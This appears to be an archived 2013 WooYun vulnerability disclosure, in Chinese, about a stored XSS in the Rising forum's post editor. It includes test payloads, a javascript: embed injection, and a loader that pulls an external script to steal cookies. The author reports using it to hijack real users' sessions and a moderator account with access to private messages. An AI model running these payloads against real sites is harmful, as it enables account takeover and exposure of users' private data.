@@ -1,0 +1,274 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		对瑞星1rank储存型xss的分析与利用（xss如何变废为宝）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		对瑞星1rank储存型xss的分析与利用（xss如何变废为宝）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-08-06 17:19</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-26：	细节向普通白帽子公开<br/>
+									2013-09-05：	细节向实习白帽子公开<br/>
+									2013-09-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">发现瑞星给好多储存型xss只给1rank，难道储存型xss的危害价值在瑞星看来就只值1rank？此漏洞附有比较长的xss挖掘与利用的分析，喜欢看XSS漏洞分析，以及不知道XSS能干嘛的可以关注看看。同时希望可以引起厂商对于xss漏洞的重视~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞位置：论坛发帖回帖富文本编辑器<br />
+<br />
+漏洞危害：<br />
+<br />
+1 盗取用户登录cookie并成功登录<br />
+<br />
+2 论坛等位置xss蠕虫<br />
+<br />
+3 盗取管理员帐号获得大量敏感信息和操作权限<br />
+<br />
+<br />
+<br />
+详细过程这里分两个部分：<br />
+<br />
+一、XSS的挖掘分析<br />
+<br />
+<br />
+<br />
+1 首先是看到一些储存型xss漏洞只给1rank比较气愤，觉得厂商不重视，在看到二哥gainover的回复，决定去挖掘实例让厂商引起对xss的重视度。传送门： <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-014996">WooYun: 偶然发现的卡卡论坛存储型xss...</a> <br />
+<br />
+</p><p class="detail"><a href="../images/06164801c4ffc845343643b72f8d57d804ea7b13.png" target="_blank"><img src="../images/06164801c4ffc845343643b72f8d57d804ea7b13.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2 开始xss挖掘过程，这里我定位到论坛的发帖回帖富文本编辑器位置。因为论坛的用户量比较大，而且富文本编辑器位置往往容易出现xss。测试的时候，一般随便选一个帖子在回复位置测试，不要去发帖子测试。因为回帖和发帖的位置一般都用的是一个富文本，回帖位置比较隐蔽，不易被发现。<br />
+<br />
+3 先直接测试有没有过滤常用xss代码，输入</p><pre><code>&lt;/textarea&gt;&#039;&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre><p class='detail'>发现被直接输出了，看来常用的xss代码是有过滤的。F12看了一下输出点，也没有找到其他什么可以构造的xss点。<br />
+<br />
+</p><p class="detail"><a href="../images/0616485500e34c589f96445c7a734d9d67af52b9.png" target="_blank"><img src="../images/0616485500e34c589f96445c7a734d9d67af52b9.png" alt="000.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4 下来就测试一下其他位置吧，随便输入一些字符，试了试插图，这里也过滤了。<br />
+<br />
+</p><p class="detail"><a href="../images/0616491245920121a4287601fe8d850e0290d6fb.png" target="_blank"><img src="../images/0616491245920121a4287601fe8d850e0290d6fb.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+5 然后在发帖后点击编辑，看到了这里多了个插入视频选项，这下眼前一亮诶。<br />
+<br />
+</p><p class="detail"><a href="../images/06164922865d7efc8634da324ffb0b03e3d82411.png" target="_blank"><img src="../images/06164922865d7efc8634da324ffb0b03e3d82411.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+6 看到这个论坛的模式和编辑器很像discuz phpwind那些，所以果断插入代码：javascript:alert(1)  文件类型选择mp3<br />
+<br />
+</p><p class="detail"><a href="../images/06164933c3296f6db866f7b5325d3c7ff312761d.png" target="_blank"><img src="../images/06164933c3296f6db866f7b5325d3c7ff312761d.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+7 确认保存提交修改内容，吼吼，弹窗了。<br />
+<br />
+</p><p class="detail"><a href="../images/06164947e14412f9258bbd1f9c8c1259ee980404.png" target="_blank"><img src="../images/06164947e14412f9258bbd1f9c8c1259ee980404.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+8 F12看一下，发现这里是用到&lt;embed&gt;标签，所以可以直接在src位置利用javascript加载js代码。<br />
+<br />
+</p><p class="detail"><a href="../images/06164957d4a9d6f1507cf42ccb7721715c7557a2.png" target="_blank"><img src="../images/06164957d4a9d6f1507cf42ccb7721715c7557a2.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+9 好的，XSS的挖掘分析到此结束。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+二、XSS的利用分析<br />
+<br />
+<br />
+<br />
+1 首先F12看了下，发现论坛的cookie是没有http-only的，那么只要能xss到cookie，理论上来说就可以利用用户的登录cookie去登录用户帐号。<br />
+<br />
+</p><p class="detail"><a href="../images/0616501149ef7f2f3034ec8fcf3b6f3d3dde1675.png" target="_blank"><img src="../images/0616501149ef7f2f3034ec8fcf3b6f3d3dde1675.png" alt="666.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2 所以发了一个带有盗用用户cookie的xss的帖子（帖子的标题是为了引诱管理员过来）。<br />
+<br />
+利用代码为：</p><pre><code>javascript:with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&#039;外部js文件地址&#039;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/061650292aed8f84b21d313b754c96faeee58dc6.png" target="_blank"><img src="../images/061650292aed8f84b21d313b754c96faeee58dc6.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3 自己先试了试可以成功获取到cookie，然后不一会就收到了一些cookie（由于是自动加载，所以只要访问帖子就会中招）。<br />
+<br />
+</p><p class="detail"><a href="../images/06165043f1b2a7ea7981bda9d60549fe8ab1cbf2.png" target="_blank"><img src="../images/06165043f1b2a7ea7981bda9d60549fe8ab1cbf2.png" alt="77.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4 利用xss到的cookie，成功登录的用户帐号。<br />
+<br />
+</p><p class="detail"><a href="../images/061650561df628059b3835dfbca41de4b4eb1fc1.png" target="_blank"><img src="../images/061650561df628059b3835dfbca41de4b4eb1fc1.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+5 看了下，果然是因为访问了那个帖子中招的。<br />
+<br />
+</p><p class="detail"><a href="../images/06165112f2333c2fcf37ae18c32640b19990ec10.png" target="_blank"><img src="../images/06165112f2333c2fcf37ae18c32640b19990ec10.png" alt="9.png" width="600"/></a></p><p class="detail"><br />
+<br />
+6 再看了看信息，呵呵，完全和我计划的一样，搞的了大版主帐号。<br />
+<br />
+</p><p class="detail"><a href="../images/06165124cffb6b3ced220a550ba53ea08ad698b3.png" target="_blank"><img src="../images/06165124cffb6b3ced220a550ba53ea08ad698b3.png" alt="10.png" width="600"/></a></p><p class="detail"><br />
+<br />
+7 下面就是利用大版主的帐号可以干的事情了，由于cookie没有http-only，而且是一站式cookie，所以能干的事情也蛮多的额。<br />
+<br />
+对任意用户进行禁言等操作<br />
+<br />
+</p><p class="detail"><a href="../images/06165141536322b006f531e14cf12ee14be57ac0.png" target="_blank"><img src="../images/06165141536322b006f531e14cf12ee14be57ac0.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/061651565451c4c4ed2761bf558cb2c43c41001b.png" target="_blank"><img src="../images/061651565451c4c4ed2761bf558cb2c43c41001b.png" alt="12.png" width="600"/></a></p><p class="detail"><br />
+<br />
+对任意帖子进行删除、指定、加精等操作<br />
+<br />
+</p><p class="detail"><a href="../images/06165221004bf65e85a70a031ed0e101dbc74dd7.png" target="_blank"><img src="../images/06165221004bf65e85a70a031ed0e101dbc74dd7.png" alt="13.png" width="600"/></a></p><p class="detail"><br />
+<br />
+短消息邮箱里面的1000多条用户的安全信息及隐私信息<br />
+<br />
+</p><p class="detail"><a href="../images/06165237fcd0f140a8cca7accf067b15b49c678f.png" target="_blank"><img src="../images/06165237fcd0f140a8cca7accf067b15b49c678f.png" alt="14.png" width="600"/></a></p><p class="detail"><br />
+<br />
+瑞星网站的其他站点的业务操作<br />
+<br />
+</p><p class="detail"><a href="../images/061652515e2e9c8b6aeeb314856e20d992daf3ee.png" target="_blank"><img src="../images/061652515e2e9c8b6aeeb314856e20d992daf3ee.png" alt="15.png" width="600"/></a></p><p class="detail"><br />
+<br />
+8 看了一下，论坛的发帖回帖等操作都是没有token等参数的，所以可以蠕虫，这里不在详细进行展示了。如需验证，可以私下联系我。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">插入盗取cookie的帖子的地址：</p><pre><code>http://bbs.ikaka.com/showtopic.aspx?page=end&amp;topicid=9251068#11942968</code></pre><p class='detail'><br />
+<br />
+这个帖子也插了条，在回复位置：</p><pre><code>http://bbs.ikaka.com/showtopic-9250670.aspx</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1 过滤下javascript字符串<br />
+<br />
+2 post请求加token<br />
+<br />
+3 没见过你们送礼物额~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033648" title="对瑞星1rank储存型xss的分析与利用（xss如何变废为宝）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-08-06 17:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">3Q。。。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33648";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
